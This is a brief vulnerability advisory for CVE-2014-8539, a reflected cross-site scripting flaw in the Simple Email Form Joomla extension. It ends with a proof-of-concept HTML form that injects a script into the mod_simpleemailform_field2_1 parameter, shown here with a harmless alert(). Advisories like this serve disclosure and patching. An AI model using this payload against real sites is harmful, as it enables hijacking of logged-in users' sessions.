1) Reflected Cross-Site Scripting (XSS) in Simple Email Form Joomla Extension: CVE-2014-8539

Input passed via the "mod_simpleemailform_field2_1" HTTP POST parameter to "/index.php" script is not properly sanitised before being returned to the user. A remote attacker can trick a logged-in user to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.

The exploitation example below uses the "alert()" JavaScript function to display "immuniweb" word:


<form action="http://[host]/index.php" method="post" name="main">
<input type="hidden" name="mod_simpleemailform_field1_1" value="email@email.com">
<input type="hidden" name="mod_simpleemailform_field2_1" value=&#039;"><script>alert("immuniweb");</script>&#039;>
<input type="hidden" name="mod_simpleemailform_submit_1" value="Submit">
<input type="submit" id="btn">
</form>
